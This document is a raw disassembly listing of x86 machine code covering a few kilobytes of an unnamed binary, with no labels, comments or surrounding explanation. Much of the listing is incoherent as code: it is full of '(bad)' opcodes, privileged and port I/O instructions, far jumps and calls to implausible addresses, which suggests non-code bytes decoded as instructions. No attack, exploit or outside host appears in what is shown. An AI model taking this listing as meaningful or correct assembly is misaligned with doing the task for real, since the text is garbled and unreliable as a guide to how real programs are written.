  430f4c:	push   ds
  430f4d:	mov    edx,0x8a7d21a3
  430f52:	ins    DWORD PTR es:[edi],dx
  430f53:	sahf   
  430f54:	adc    ah,BYTE PTR [esi+0x15]
  430f57:	push   esp
  430f58:	mov    al,0xad
  430f5a:	je     0x430f7d
  430f5c:	xchg   edx,eax
  430f5d:	frstor [eax]
  430f5f:	push   ecx
  430f60:	in     al,dx
  430f61:	add    DWORD PTR ds:0x86cbf072,eax
  430f67:	xchg   BYTE PTR [ebp-0x66986cea],dl
  430f6d:	fsubrp st(0),st
  430f6f:	sub    ecx,DWORD PTR [ebp-0x7dc222b0]
  430f75:	vdivps xmm0,xmm3,XMMWORD PTR [ebp+eax*2-0x2f95f672]
  430f7f:	repnz dec esi
  430f81:	and    eax,0xa028f306
  430f86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430f87:	ja     0x430f99
  430f89:	adc    BYTE PTR [ecx],ah
  430f8b:	outs   dx,BYTE PTR ds:[esi]
  430f8c:	dec    edx
  430f8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430f8e:	sbb    DWORD PTR [edx+0x5f5534c7],ebp
  430f94:	inc    edi
  430f95:	(bad)  
  430f96:	pop    ds
  430f97:	je     0x430f7b
  430f99:	sbb    eax,0xfaa5730f
  430f9e:	add    esi,DWORD PTR [ecx-0x53839d56]
  430fa4:	pop    ss
  430fa5:	jo     0x430fa0
  430fa7:	in     al,0x4b
  430fa9:	nop
  430faa:	xchg   ebx,eax
  430fab:	ds mov ebx,0xbbff4cd9
  430fb1:	in     eax,0xd3
  430fb3:	mov    ebp,0xb11d69d6
  430fb8:	cmp    dh,BYTE PTR [edi+esi*4]
  430fbb:	and    eax,0x39097883
  430fc0:	mov    esp,0x0
	...
  431031:	add    BYTE PTR [eax],al
  431033:	add    bh,al
  431035:	ins    DWORD PTR es:[edi],dx
  431036:	aam    0xb5
  431038:	(bad)  
  431039:	mov    ebp,0xead87fe7
  43103e:	fs dec esp
  431040:	mov    ch,0x4e
  431042:	mov    eax,ds:0x204a87c
  431047:	add    BYTE PTR [edi],dh
  431049:	add    BYTE PTR [eax],al
  43104b:	add    BYTE PTR [edx+0x69f9264a],al
  431051:	mov    al,ds:0x7cec7722
  431056:	sbb    BYTE PTR [esi],dl
  431058:	sub    al,0x33
  43105a:	sti    
  43105b:	mov    ah,0x5f
  43105d:	in     al,0xa5
  43105f:	cmc    
  431060:	outs   dx,DWORD PTR ds:[esi]
  431061:	pop    ss
  431062:	loope  0x4310c0
  431064:	xor    esi,esi
  431066:	push   ds
  431067:	in     eax,dx
  431068:	sti    
  431069:	ret    
  43106a:	and    DWORD PTR [esi+0x30],0xc11784ae
  431071:	and    al,0x59
  431073:	and    ah,BYTE PTR [edi]
  431075:	adc    edx,DWORD PTR [esi]
  431077:	add    BYTE PTR [ebx],al
  431079:	sti    
  43107a:	imul   edi,DWORD PTR [esi-0x5180dddc],0x1eb3b8
	...
  4310b4:	dec    ebp
  4310b5:	push   ebp
  4310b6:	mov    DWORD PTR [ebx-0x7e9f13f8],ecx
  4310bc:	mov    esp,ebp
  4310be:	or     al,ah
  4310c0:	dec    ebp
  4310c1:	add    bh,al
  4310c3:	add    BYTE PTR [eax],cl
  4310c5:	add    BYTE PTR [eax],al
  4310c7:	mov    DWORD PTR [eax],0x3ef44545
  4310cd:	add    BYTE PTR ss:[ebp-0x70b6375],al
  4310d4:	retf   
  4310d5:	(bad)  
  4310d6:	enter  0x4d45,0xb8
  4310da:	mov    edi,DWORD PTR [ecx]
  4310dc:	hlt    
  4310dd:	test   ebx,ecx
  4310df:	pushf  
  4310e0:	enter  0x4df8,0x8b
  4310e4:	mov    DWORD PTR [ebp+0x8],0x894708
  4310eb:	inc    ebp
  4310ec:	mov    ebp,0xff8bfffc
  4310f1:	dec    ebp
  4310f2:	mov    ch,0xf4
  4310f4:	call   DWORD PTR [ebx-0x1]
  4310f7:	mov    ebx,0x8005122
  4310fc:	call   DWORD PTR [ecx+0x8]
  4310ff:	pop    es
  431100:	jmp    0xb8:0x9cb4533
  431107:	cdq    
  431108:	mov    esi,DWORD PTR [edx-0xc]
  43110b:	xor    al,bl
  43110d:	add    BYTE PTR [ecx+0x3c83203],bl
  431113:	mov    DWORD PTR [ecx+0x45c4084d],ecx
  431119:	mov    eax,DWORD PTR [ebx-0xb87b3]
  43111f:	xor    eax,DWORD PTR [eax]
  431121:	retf   
  431122:	ret    
  431123:	add    eax,esi
  431125:	enter  0x8945,0x64
  431129:	dec    ebp
  43112a:	sbb    ah,cl
  43112c:	add    BYTE PTR [ebx-0xb87b277],cl
  431132:	dec    DWORD PTR [ebx-0xbcfb275]
  431138:	test   DWORD PTR [ebx],esi
  43113a:	dec    ebx
  43113c:	inc    DWORD PTR [ebx]
  43113e:	inc    eax
  43113f:	enter  0x8989,0x64
  431143:	(bad)  
  431144:	jmp    FWORD PTR [ebx+ecx*4-0x1]
  431148:	cld    
  431149:	dec    DWORD PTR [ebp-0xa90001]
  43114f:	push   edi
  431150:	mov    BYTE PTR [edx+0x1],ch
  431153:	and    BYTE PTR [eax],al
  431155:	pop    ecx
  431156:	inc    ebp
  431157:	mov    DWORD PTR [ebp-0xb28ff8],ecx
  43115d:	push   0xffffff89
  43115f:	pop    ecx
  431160:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431161:	dec    ebp
  431162:	add    BYTE PTR [ecx+0x45fc088b],cl
  431168:	jne    0x4311b2
  43116a:	lea    eax,[eax]
  43116c:	fs (bad) 
  43116e:	dec    DWORD PTR [eax]
  431170:	mov    DWORD PTR [eax],eax
  431172:	test   al,0x0
  431174:	add    BYTE PTR [ebp-0x18],cl
  431177:	xor    ebp,DWORD PTR [edx]
  431179:	add    eax,DWORD PTR [eax]
  43117b:	mov    eax,eax
  43117d:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  431184:	inc    ebp
  431185:	mov    DWORD PTR [ebx+0x459408],ecx
  43118b:	popa   
  43118c:	mov    esp,DWORD PTR [ebp-0x75]
  43118f:	(bad)  
  431190:	cld    
  431191:	inc    eax
  431192:	cmp    bh,0x1
  431195:	lea    eax,[eax]
  431197:	and    BYTE PTR [eax],al
  431199:	inc    DWORD PTR [ecx-0x18]
  43119c:	mov    ecx,DWORD PTR [ebx]
  43119e:	cld    
  43119f:	add    BYTE PTR [ecx+0x75014d],cl
  4311a5:	(bad)  
  4311a6:	xchg   ebp,eax
  4311a7:	sar    bh,1
  4311a9:	inc    eax
  4311aa:	inc    DWORD PTR [eax]
  4311ac:	mov    eax,DWORD PTR [ebp-0x4]
  4311af:	xor    edx,DWORD PTR [edx+0x7201be]
  4311b5:	add    BYTE PTR [edx],dl
  4311b7:	(bad)  
  4311b8:	nop
  4311b9:	inc    ebp
  4311ba:	add    BYTE PTR [ebx-0x5afb0c00],cl
  4311c0:	mov    al,0xff
  4311c2:	add    bh,bh
  4311c4:	add    BYTE PTR [ebx],dh
  4311c6:	inc    DWORD PTR [ebx]
  4311c8:	sbb    al,0x89
  4311ca:	jne    0x4311a8
  4311cc:	mov    esp,DWORD PTR [ecx+0x4500fc]
  4311d2:	mov    eax,DWORD PTR [ebp-0xff0048]
  4311d8:	mov    DWORD PTR [eax-0x70],0xe870e989
  4311df:	inc    DWORD PTR [ebp-0x75]
  4311e2:	(bad)  [esi+ebp*8]
  4311e5:	test   DWORD PTR [esi-0x1],esp
  4311e8:	inc    ebp
  4311e9:	(bad)  
  4311ea:	aas    
  4311eb:	inc    ebp
  4311ec:	(bad)  
  4311ed:	lea    edi,[eax+edi*2-0x1]
  4311f1:	inc    edi
  4311f3:	mov    DWORD PTR [ecx],edi
  4311f5:	mov    al,ds:0x8b8000c7
  4311fa:	call   0x45d0f4fb
  4311ff:	(bad)  
  431200:	out    dx,al
  431201:	(bad)  
  431202:	fisttp WORD PTR [eax+0x8801c7]
  431208:	jecxz  0x43124f
  43120a:	call   0xe83f580e
  43120f:	lea    edi,[edi]
  431211:	(bad)  
  431212:	call   0xcb3d16
  431217:	add    DWORD PTR [ebx-0x7f570400],ecx
  43121d:	add    BYTE PTR [ecx],al
  43121f:	test   DWORD PTR [eax],eax
  431221:	wrmsr  
  431223:	jae    0x431212
  431225:	add    BYTE PTR [eax],al
  431227:	mov    eax,DWORD PTR [ebp-0x747f8a04]
  43122d:	add    esp,edi
  43122f:	add    BYTE PTR [eax+0x450108],al
  431235:	mov    edi,DWORD PTR [ebp-0x6c]
  431238:	add    DWORD PTR [eax],0x4
  43123b:	mov    eax,DWORD PTR [ebp+0x3]
  43123e:	mov    edi,DWORD PTR [esp+edi*8]
  431241:	dec    ebp
  431242:	nop
  431243:	mov    eax,DWORD PTR [ecx]
  431245:	fadd   DWORD PTR [eax]
  431247:	add    BYTE PTR [esi],al
  431249:	lea    eax,[eax]
  43124b:	pusha  
  43124c:	push   eax
  43124d:	inc    DWORD PTR [ebp+0x52]
  431250:	call   DWORD PTR [ebp-0x7b]
  431253:	mov    esi,DWORD PTR [ebp-0x74]
  431256:	mov    eax,DWORD PTR [eax]
  431258:	cld    
  431259:	mov    eax,DWORD PTR [eax+0x880103]
  43125f:	add    BYTE PTR [ebp+0x6a],bh
  431262:	cmp    edi,0x10
  431265:	mov    WORD PTR [ebp+0x0],es
  431268:	mov    edx,DWORD PTR [edx-0x4]
  43126b:	push   ecx
  43126c:	nop
  43126d:	inc    DWORD PTR [ecx]
  43126f:	cld    
  431270:	add    BYTE PTR [ebp-0x24],bh
  431273:	mov    eax,DWORD PTR [eax]
  431275:	cld    
  431276:	push   eax
  431277:	nop
  431278:	inc    ebp
  431279:	add    edi,edi
  43127b:	add    BYTE PTR [ebx+0x4de2f445],cl
  431281:	jmp    0xe33b:0x9403c733
  431288:	movntq QWORD PTR [esi],mm6
  43128b:	mov    DWORD PTR [eax],0xb87e8b98
  431291:	test   ebx,eax
  431293:	jmp    DWORD PTR [edi-0x1]
  431296:	int    0xe9
  431298:	sub    esp,esi
  43129a:	add    eax,DWORD PTR [ebp-0x30]
  43129d:	fild   WORD PTR [ebp+0x3f]
  4312a0:	cmp    eax,edi
  4312a2:	je     0xcc43f8c4
  4312a8:	mov    DWORD PTR [ebp-0x28],0xdb00eb
  4312af:	(bad)  
  4312b0:	jne    0x43123e
  4312b2:	mov    ebx,ecx
  4312b4:	cld    
  4312b5:	jle    0x4312fc
  4312b7:	cmp    ecx,DWORD PTR [ebx+0x50b400]
  4312bd:	inc    ebp
  4312be:	call   0xeb3c4e
  4312c3:	add    BYTE PTR [ebx-0x7f170301],cl
  4312c9:	add    DWORD PTR es:[eax],eax
  4312cc:	add    al,al
  4312ce:	xor    BYTE PTR [eax+0x41],dl
  4312d1:	inc    ebp
  4312d2:	add    BYTE PTR [ebx+0xfcd88b],cl
  4312d8:	mov    DWORD PTR [ebx-0x3fff03ff],ecx
  4312de:	add    DWORD PTR [ecx+0x458be845],ecx
  4312e4:	fmul   DWORD PTR [ebx+0x8bb800]
  4312ea:	cld    
  4312eb:	call   0xd83db0
  4312f0:	dec    DWORD PTR [ebx+0x1090e8ff]
  4312f6:	add    al,al
  4312f8:	push   eax
  4312f9:	es inc ebp
  4312fb:	inc    ebp
  4312fc:	mov    ecx,DWORD PTR [ebx+0xd89c]
  431302:	dec    DWORD PTR [ebx-0x3ff70301]
  431308:	mov    DWORD PTR gs:[eax],eax
  43130b:	call   0x8b6b58d0
  431310:	inc    ebp
  431311:	mov    eax,0xe8d8008b
  431316:	add    BYTE PTR [ecx],ch
  431318:	mov    eax,DWORD PTR [eax]
  43131a:	cld    
  43131b:	mov    eax,eax
  43131d:	call   0x462b2377
  431322:	sub    DWORD PTR [ebx-0x3c743000],ecx
  431328:	cld    
  431329:	mov    BYTE PTR [eax+0x8401c1],0x1
  431330:	xor    BYTE PTR [eax],al
  431332:	push   edi
  431333:	inc    ebp
  431334:	mov    DWORD PTR [ebx],esi
  431336:	in     al,0xb9
  431338:	inc    ebp
  431339:	lea    ecx,[ebx-0x3c370301]
  43133f:	dec    ebp
  431340:	cdq    
  431341:	mov    esi,DWORD PTR [edx]
  431343:	or     BYTE PTR [ebx],al
  431345:	ror    DWORD PTR [ebp-0xfebf79],0x0
  43134c:	call   0x433c96
  431351:	add    BYTE PTR [ebx+0x75fcf4ff],cl
  431357:	jge    0x43138c
  431359:	mov    eax,DWORD PTR [ebx]
  43135b:	cld    
  43135c:	lea    edx,[eax+0xff0120]
  431362:	call   0x433cf6
  431367:	push   eax
  431368:	inc    DWORD PTR [ebp-0x1c]
  43136b:	mov    ecx,DWORD PTR [ebp-0x58]
  43136e:	xor    eax,DWORD PTR [eax]
  431370:	add    edi,edi
  431372:	cmp    ebp,eax
  431374:	jne    0x43139c
  431376:	mov    DWORD PTR [eax],0x8b004dd8
  43137c:	add    BYTE PTR [ebp+eax*2+0x8898b00],bl
  431383:	mov    eax,ebx
  431385:	cld    
  431386:	test   BYTE PTR [eax+0x320199],bh
  43138c:	mov    DWORD PTR [ebp+0x8],esi
  43138f:	xor    eax,DWORD PTR [ebp-0x73]
  431392:	test   DWORD PTR [esp+esi*2-0x1],edi
  431396:	mov    ebp,eax
  431398:	mov    eax,0x33004d29
  43139d:	mov    ecx,DWORD PTR [ebp+0x728008fc]
  4313a3:	add    DWORD PTR [eax],eax
  4313a5:	add    BYTE PTR [ebp+0x30],al
  4313a8:	mov    edx,DWORD PTR [edi-0x48]
  4313ab:	add    ebx,0xffffffe4
  4313ae:	addr16 test ebp,ecx
  4313b1:	je     0x4313de
  4313b3:	mov    eax,DWORD PTR [ebx]
  4313b5:	cld    
  4313b6:	sar    BYTE PTR [eax+0x3b0145],1
  4313bc:	pcmpeqw mm4,mm6
  4313bf:	xor    edi,edi
  4313c1:	lea    ecx,[ebx-0x239c7470]
  4313c7:	add    BYTE PTR [ebp+0x50],cl
  4313ca:	cmp    eax,DWORD PTR [ebp+0x75]
  4313cd:	mov    ebp,DWORD PTR [eax-0x68]
  4313d0:	test   DWORD PTR [eax],eax
  4313d2:	clc    
  4313d3:	push   DWORD PTR [ebp-0x1]
  4313d6:	lea    ecx,[eax]
  4313d8:	int3   
  4313d9:	inc    ebp
  4313da:	call   0xfb446a
  4313df:	jne    0x4313d9
  4313e1:	xor    edi,DWORD PTR [ebp-0x41]
  4313e4:	jmp    0x431458
  4313e6:	mov    eax,DWORD PTR [eax]
  4313e8:	mov    eax,0x339545c7
  4313ed:	inc    DWORD PTR [ebx]
  4313ef:	push   DWORD PTR [ecx]
  4313f1:	aaa    
  4313f2:	mov    eax,DWORD PTR [eax]
  4313f4:	jmp    0x431446
  4313f6:	mov    eax,DWORD PTR [ebp-0x3c]
  4313f9:	mov    eax,eax
  4313fb:	cld    
  4313fc:	clc    
  4313fd:	ret    
  4313fe:	test   bh,al
  431400:	pop    es
  431401:	xchg   ebp,eax
  431402:	add    bh,bh
  431404:	inc    ebp
  431405:	dec    DWORD PTR [edi]
  431407:	and    DWORD PTR [ebx],ebp
  431409:	add    BYTE PTR [eax],al
  43140b:	push   eax
  43140c:	jbe    0x431463
  43140e:	mov    cl,BYTE PTR [ebx-0x34e00b80]
  431414:	or     al,0xcf
  431416:	inc    eax
  431417:	enter  0x745,0x72
  43141b:	inc    ebp
  43141c:	mov    eax,DWORD PTR [ecx]
  43141e:	int3   
  43141f:	add    BYTE PTR [ebp-0x75],al
  431422:	ss mov eax,0x33c74d9c
  431428:	ror    BYTE PTR [ebp+0x72f80885],1
  43142e:	inc    ebp
  43142f:	add    BYTE PTR [ebx-0x3c7423bb],cl
  431435:	fadd   st,st(6)
  431437:	rol    BYTE PTR [ebp+0x12],0x8b
  43143b:	inc    ebp
  43143c:	fmul   QWORD PTR [ebx-0x3c39233d]
  431442:	inc    ebp
  431443:	test   bh,al
  431445:	cdq    
  431446:	clc    
  431447:	xor    al,BYTE PTR [ebp+0x45dcf889]
  43144d:	inc    ebp
  43144e:	cmp    BYTE PTR [ebx],dh
  431450:	pushf  
  431451:	mov    ecx,0xffb48dc7
  431456:	test   eax,ecx
  431458:	clc    
  431459:	dec    ebp
  43145a:	inc    ebp
  43145b:	mov    edi,DWORD PTR [edx]
  43145d:	or     BYTE PTR [ecx+eax*8-0x15b7939],bl
  431464:	test   edi,edi
  431466:	clc    
  431467:	test   DWORD PTR [ebp+0x45],0x89c8b3c
  43146e:	(bad)  
  43146f:	enter  0x18e8,0x85
  431473:	ss clc 
  431475:	pushf  
  431476:	inc    ebp
  431477:	dec    DWORD PTR [ebx-0x3cba0f04]
  43147d:	push   eax
  43147e:	xabort 0x7d
  431481:	add    BYTE PTR [ebx],bh
  431483:	mov    ecx,DWORD PTR [edi]
  431485:	mov    DWORD PTR [eax],ebx
  431487:	les    eax,FWORD PTR [eax]
  431489:	adc    ebp,ecx
  43148b:	dec    ebp
  43148c:	add    DWORD PTR [ebx-0x34ba3c00],ecx
  431492:	mov    ecx,esi
  431494:	lock or al,cl
  431497:	clc    
  431498:	inc    ebp
  431499:	add    esi,DWORD PTR [ebx]
  43149b:	jge    0x4314a0
  43149d:	xor    edi,DWORD PTR [ebx]
  43149f:	cmp    ecx,DWORD PTR [edi]
  4314a1:	paddb  mm1,QWORD PTR [eax+eax*1+0x0]
  4314a6:	mov    edi,DWORD PTR [ecx]
  4314a8:	test   al,0xcc
  4314aa:	dec    ebp
  4314ab:	test   BYTE PTR [ebx],dh
  4314ad:	pop    es
  4314ae:	xor    eax,DWORD PTR [eax]
  4314b0:	add    ecx,DWORD PTR [esi]
  4314b2:	add    ecx,eax
  4314b4:	psraw  mm0,mm1
  4314b7:	sub    BYTE PTR [ebp+0x38],cl
  4314ba:	mov    edi,DWORD PTR [ebx]
  4314bc:	lock int3 
  4314be:	shl    edx,1
  4314c0:	rol    BYTE PTR [ebp+0xc],1
  4314c3:	mov    DWORD PTR [ebp-0x24],0xf8038533
  4314ca:	jmp    0x7c1514
  4314cf:	pushf  
  4314d0:	inc    ebp
  4314d1:	mov    DWORD PTR [ebx-0x3cba0710],ecx
  4314d7:	xor    ecx,ebx
  4314d9:	add    ecx,esi
  4314db:	mov    esi,eax
  4314dd:	enter  0x45af,0x8b
  4314e1:	xor    ecx,eax
  4314e3:	add    edx,DWORD PTR [ebp-0x77]
  4314e6:	sub    ecx,DWORD PTR [eax]
  4314e8:	cmp    eax,DWORD PTR [ebp+0x77]
  4314eb:	(bad)  
  4314ec:	mov    ebx,DWORD PTR [eax+ebp*4+0xa889c7]
  4314f3:	test   DWORD PTR [ebx+0x4d45acf8],ecx
  4314f9:	cmp    esi,DWORD PTR [ebx]
  4314fb:	pushf  
  4314fc:	xor    eax,edi
  4314fe:	add    ebp,DWORD PTR [ebx+eax*1-0x3e07f07b]
  431505:	inc    ebp
  431506:	dec    ebp
  431507:	cmp    eax,0xc7f09c8b
  43150c:	sar    DWORD PTR [eax+edx*8+0x45f80585],1
  431513:	inc    ebp
  431514:	jmp    0x431555
  431516:	mov    ebx,DWORD PTR [esp+eiz*4+0x33dc4d8b]
  43151d:	dec    ebp
  43151e:	xor    esi,DWORD PTR [ebx]
  431520:	add    eax,DWORD PTR [ebx]
  431522:	add    ecx,DWORD PTR [ecx-0x373e4ff1]
  431528:	dec    ebp
  431529:	test   BYTE PTR [ebx-0x2eff0ffe],cl
  43152f:	out    dx,eax
  431530:	rol    BYTE PTR [eax],1
  431532:	add    eax,0xebc8458b
  431537:	dec    ebp
  431538:	mov    ebp,DWORD PTR [ebx]
  43153a:	mov    esp,0x33f84d8b
  43153f:	ret    
  431540:	xor    eax,esi
  431542:	add    ecx,eax
  431544:	add    eax,DWORD PTR [edx+0xc1010f]
  43154a:	dec    ebp
  43154b:	inc    ebp
  43154c:	mov    ecx,DWORD PTR [ebx-0x3c2e0710]
  431552:	ror    bl,1
  431554:	add    eax,0xebc645ce
  431559:	scas   eax,DWORD PTR es:[edi]
  43155a:	mov    ecx,DWORD PTR [ebx+0x554dc8e8]
  431560:	xor    ebp,DWORD PTR [ebx]
  431562:	xor    edi,DWORD PTR [ebx]
  431564:	add    esi,DWORD PTR [edi+0x3]
  431567:	mov    ecx,DWORD PTR [edi]
  431569:	clc    
  43156a:	rol    ebx,0x4d
  43156d:	(bad)  
  43156e:	mov    edi,DWORD PTR [eax+esi*8-0x2f742f00]
  431575:	mov    ah,0x45
  431577:	dec    ebp
  431578:	jbe    0x4315ad
  43157a:	mov    esi,DWORD PTR [ebx]
  43157c:	call   0x33466284
  431581:	rdpmc  
  431583:	rol    DWORD PTR [ebx],0x4d
  431586:	add    ecx,DWORD PTR [ebx-0x2e3e0ff1]
  43158c:	inc    ebp
  43158d:	ror    BYTE PTR [ebx+0x45450808],1
  431593:	jmp    0x10b1623
  431598:	inc    ebp
  431599:	inc    ebp
  43159a:	(bad)  
  43159b:	mov    ebx,eax
  43159d:	clc    
  43159e:	test   ebx,eax
  4315a0:	clc    
  4315a1:	retf   
  4315a2:	inc    ebp
  4315a3:	into   
  4315a4:	mov    esi,0x8b85afec
  4315aa:	clc    
  4315ab:	enter  0x5545,0x38
  4315af:	sub    ebx,DWORD PTR [ebx+edi*1-0x74278875]
  4315b6:	ret    
  4315b7:	mov    ah,0xc6
  4315b9:	addr16 push 0x338b4545
  4315bf:	clc    
  4315c0:	add    eax,ebx
  4315c2:	loopne 0x43158f
  4315c4:	dec    ebp
  4315c5:	into   
  4315c6:	mov    al,dh
  4315c8:	or     BYTE PTR [edi-0x37ff748e],ch
  4315ce:	inc    ebp
  4315cf:	push   ebp
  4315d0:	mov    ebp,DWORD PTR [ebx]
  4315d2:	in     al,dx
  4315d3:	cmp    eax,ebx
  4315d5:	ja     0x43161c
  4315d7:	mov    ecx,DWORD PTR [ebx-0x7bba2354]
  4315dd:	inc    ebp
  4315de:	cdq    
  4315df:	mov    esi,DWORD PTR [edx]
  4315e1:	clc    
  4315e2:	mov    bl,al
  4315e4:	xlat   BYTE PTR ds:[ebx]
  4315e5:	retf   
  4315e6:	inc    ebp
  4315e7:	into   
  4315e8:	mov    eax,esi
  4315ea:	in     al,dx
  4315eb:	scas   eax,DWORD PTR es:[edi]
  4315ec:	retf   
  4315ed:	mov    ecx,DWORD PTR [ebp-0x38]
  4315f0:	mov    edx,DWORD PTR [ebp-0x24]
  4315f3:	sub    eax,DWORD PTR [ebx+edi*1-0x74cd8867]
  4315fa:	mov    ah,BYTE PTR [edi+edx*8+0x33454d23]
  431601:	mov    eax,DWORD PTR [ebx]
  431603:	clc    
  431604:	loopne 0x4315c9
  431606:	push   ebp
  431607:	retf   
  431608:	mov    dh,al
  43160a:	adc    esi,ecx
  43160c:	jb     0x4315bd
  43160e:	add    BYTE PTR [ebx+0x558bc845],cl
  431614:	in     al,dx
  431615:	sub    eax,ebx
  431617:	cmp    ecx,ebx
  431619:	mov    eax,esi
  43161b:	mov    esp,0x45af03ce
  431620:	add    ecx,DWORD PTR [ebx-0x34ba0720]
  431626:	mov    eax,ebx
  431628:	in     al,dx
  431629:	into   
  43162a:	dec    ebp
  43162b:	(bad)  
  43162c:	xor    ebp,DWORD PTR [edi+0x80f8903]
  431632:	rol    DWORD PTR [ebp+0x4d],0x89
  431636:	xor    esp,esp
  431638:	sub    eax,DWORD PTR [ebp-0x75]
  43163b:	add    ebp,esp
  43163d:	mov    al,0x55
  43163f:	inc    ebp
  431640:	xor    esi,DWORD PTR [esi]
  431642:	add    ebx,DWORD PTR [edi+ecx*1+0x55dcca89]
  431649:	inc    ebp
  43164a:	xor    edi,DWORD PTR [ecx]
  43164c:	sub    ebx,DWORD PTR [ebp+ecx*4+0x72c011c7]
  431653:	test   DWORD PTR [eax],eax
  431655:	clc    
  431656:	enter  0x8645,0x33
  43165a:	inc    DWORD PTR [ebx]
  43165c:	(bad)  
  43165d:	jmp    0x4316a4
  43165f:	mov    ecx,DWORD PTR [ebx-0x3c3c1b28]
  431665:	inc    ebp
  431666:	(bad)  
  431667:	mov    ebp,DWORD PTR [edi-0x277b7424]
  43166d:	cdq    
  43166e:	retf   
  43166f:	xor    al,cl
  431671:	mov    BYTE PTR [ebp+0xb],cl
  431674:	lea    eax,[ebp+0x8]
  431677:	xor    esi,DWORD PTR [edx+0x3]
  43167a:	add    al,ah
  43167c:	inc    ebp
  43167d:	dec    ebp
  43167e:	mov    ecx,DWORD PTR [edx+0x72c308d0]
  431684:	addr16 add ch,cl
  431687:	inc    ebp
  431688:	sub    ecx,DWORD PTR [edx+0x4df00b03]
  43168e:	inc    ebp
  43168f:	xor    ecx,DWORD PTR [ebx-0x3c1f37fd]
  431695:	push   ebp
  431696:	(bad)  
  431697:	mov    BYTE PTR [edi+0xf723b11],ch
  43169d:	add    ch,ch
  43169f:	inc    ebp
  4316a0:	dec    DWORD PTR [ebx-0x34332775]
  4316a6:	add    al,0x4d
  4316a8:	inc    ebp
  4316a9:	mov    ecx,DWORD PTR [ebx-0x7f7b0324]
  4316af:	cdq    
  4316b0:	add    DWORD PTR [edx],esi
  4316b2:	add    BYTE PTR [ebx+0x4d00c000],cl
  4316b8:	push   DWORD PTR [ebx]
  4316ba:	int3   
  4316bb:	xor    eax,DWORD PTR [eax]
  4316bd:	add    edx,DWORD PTR [eax+0x3]
  4316c0:	mov    DWORD PTR [edi],ecx
  4316c2:	call   0x4288d788
  4316c7:	mov    DWORD PTR [ebp-0x20],esp
  4316ca:	add    BYTE PTR [ebp+0x7d],al
  4316cd:	mov    eax,DWORD PTR [eax]
  4316cf:	in     al,0x15
  4316d1:	ret    
  4316d2:	iret   
  4316d3:	(bad)  
  4316d4:	enter  0x14af,0x8b
  4316d8:	(bad)  
  4316d9:	in     al,dx
  4316da:	or     bl,cl
  4316dc:	adc    cl,al
  4316de:	push   ebp
  4316df:	dec    ebp
  4316e0:	inc    eax
  4316e1:	mov    edx,DWORD PTR [ebp-0x20]
  4316e4:	jb     0x4316b1
  4316e6:	mov    ecx,esi
  4316e8:	cld    
  4316e9:	scas   eax,DWORD PTR es:[edi]
  4316ea:	or     BYTE PTR [ebx-0x2cff27ff],0x0
  4316f1:	mov    BYTE PTR [eax],0x8c
  4316f4:	push   0xffffff99
  4316f6:	push   edi
  4316f7:	xor    dl,BYTE PTR [eax+0x3b]
  4316fa:	mov    ecx,DWORD PTR [edi]
  4316fc:	call   0x8c425c5f
  431701:	mov    eax,eax
  431703:	in     al,dx
  431704:	jge    0x431753
  431706:	mov    DWORD PTR [ebx],esi
  431708:	int3   
  431709:	add    eax,DWORD PTR [ebp+0xf]
  43170c:	xor    eax,ecx
  43170e:	(bad)  
  43170f:	dec    ebp
  431710:	pushf  
  431711:	xor    ecx,esi
  431713:	add    edi,DWORD PTR [edi]
  431715:	mov    eax,DWORD PTR [ebp-0x38]
  431718:	(bad)  
  431719:	test   dh,dl
  43171b:	cdq    
  43171c:	add    esi,DWORD PTR [edx]
  43171e:	jmp    0x4316a9
  431720:	mov    cl,al
  431722:	add    eax,0x14330f45
  431727:	mov    ecx,0xff448d80
  43172c:	jmp    0xc99026f9
  431731:	mov    edx,ecx
  431733:	rol    BYTE PTR [ebp+0x330155],1
  431739:	add    ecx,DWORD PTR [ebp+0xf]
  43173c:	xor    eax,edx
  43173e:	(bad)  
  43173f:	ror    DWORD PTR [eax],0x86
  431742:	jb     0x431741
  431744:	add    bh,bh
  431746:	clc    
  431747:	inc    ebp
  431748:	jb     0x4317b4
  43174a:	mov    ecx,DWORD PTR [ecx+0x4545c008]
  431750:	mov    ebx,DWORD PTR ss:[eax+ebx*8+0x68c000c7]
  431758:	ret    
  431759:	xor    al,bh
  43175b:	add    BYTE PTR [ebp+0x75],al
  43175e:	ss push 0xffffff9c
  431761:	inc    edi
  431763:	adc    al,0xe8
  431765:	inc    ebp
  431766:	test   DWORD PTR [ebp-0x7cba8b08],eax
  43176c:	mov    ecx,DWORD PTR [eax]
  43176e:	cld    
  43176f:	or     DWORD PTR [ebp-0x34],0x33
  431773:	jbe    0x431778
  431775:	mov    edx,DWORD PTR [ecx+0x2b]
  431778:	dec    ebp
  431779:	mov    cl,BYTE PTR [ebx+0x45d801]
  43177f:	mov    BYTE PTR [ebx],dh
  431781:	mov    eax,DWORD PTR [ebx]
  431783:	or     BYTE PTR [ecx+0x3b],dl
  431786:	dec    ebp
  431787:	int3   
  431788:	xor    ebp,edi
  43178a:	add    eax,DWORD PTR [ebp+0x51]
  43178d:	mov    ecx,DWORD PTR [ebp-0x28]
  431790:	xor    eax,DWORD PTR [eax]
  431792:	add    ebp,DWORD PTR [eax+0x51]
  431795:	adc    BYTE PTR [eax+0x0],0x8b
  431799:	add    BYTE PTR [ebx+0x4d18fcff],cl
  43179f:	inc    ebp
  4317a0:	mov    ecx,DWORD PTR [ecx+0x4500c4d8]
  4317a6:	xor    ecx,DWORD PTR [ebx+0x4551c403]
  4317ac:	dec    ebp
  4317ad:	mov    esi,DWORD PTR [ebx]
  4317af:	hlt    
  4317b0:	add    eax,ebx
  4317b2:	push   ecx
  4317b3:	inc    ebp
  4317b4:	dec    ebp
  4317b5:	(bad)  
  4317b6:	call   esi
  4317b8:	in     al,0xc7
  4317ba:	retf   
  4317bb:	mov    al,ds:0xc1ff39ce
  4317c0:	adc    al,0xc6
  4317c2:	inc    ebp
  4317c3:	and    eax,0x9c0f4c85
  4317c8:	cmp    DWORD PTR [esi-0xe7ac800],0xf
  4317cf:	cmp    BYTE PTR [ebx+0x3a],0x0
  4317d3:	mov    dh,0xc7
  4317d5:	cmp    eax,eax
  4317d7:	jne    0x45441023
  4317dd:	mov    edi,DWORD PTR [eax]
  4317df:	mov    eax,0x848bcb9c
  4317e4:	rcr    BYTE PTR [ecx-0x7c7fcd0f],0x67
  4317eb:	or     BYTE PTR [edi],cl
  4317ed:	(bad)  
  4317ee:	dec    ebp
